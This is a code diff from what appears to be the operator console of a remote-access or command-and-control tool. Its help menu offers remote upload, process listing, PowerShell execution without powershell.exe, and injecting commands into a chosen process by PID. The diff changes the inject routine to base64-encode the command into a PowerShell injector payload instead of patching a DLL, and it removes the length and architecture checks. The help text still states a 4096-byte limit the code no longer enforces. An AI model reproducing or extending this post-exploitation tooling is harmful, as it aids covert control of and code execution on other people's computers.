@@ -197,7 +197,7 @@ class Cli:
         print "\tupload        args (path/url, path)     Upload a file on the remote system"
         print "\tps                                      List processes"
         print "\tpowerless     args (powershell)         Execute Powershell command without invoking Powershell"
-        print "\tinject        args (32/64, pid, command)Inject command into a target process (max length 4096)"
+        print "\tinject        args (pid, command)       Inject command into a target process (max length 4096)"
         print "\talias         args (key, value)         Create an alias to avoid typing the same thing over and over"
         print "\tdelay         args (milliseconds)       Update the callback delay"
         print "\thelp                                    Show this help menu"
@@ -301,30 +301,17 @@ class Cli:
 
 
     def inject(self, data):
-        archs = ["32", "64"]
         try:
-            option, arch, pid, cmd = data.split(" ", 3)
+            option, pid, cmd = data.split(" ", 2)
         except:
             UI.error("Missing arguments")
             return ""
-        
-        if len(cmd) > 4096:
-            UI.error("Your command is bigger than 4096 bytes")
-            return ""
-        
-        if not arch in archs:
-            UI.error("Invalid architecture provided (32/64)")
-            return ""
-        
-        dll = Utils.load_file("bin/inject-%s.dll" % arch)
-        dll = dll.replace("A" * 4096, cmd + "\x00" * (4096 - len(cmd)))
-        
+   
         ps = Utils.load_powershell_script("injector.ps1", 1)
-        ps = Utils.update_key(ps, "PAYLOAD", base64.b64encode(dll))
+        ps = Utils.update_key(ps, "PAYLOAD", base64.b64encode(cmd))
         ps = Utils.update_key(ps, "PID", pid)
         UI.success("Injecting %s" % cmd)
-        UI.success("Into %s bits process with PID %s" % (arch, pid))
-        
+        UI.success("Into process with PID %s" % pid)
         return ps
     
     def ps(self, data):
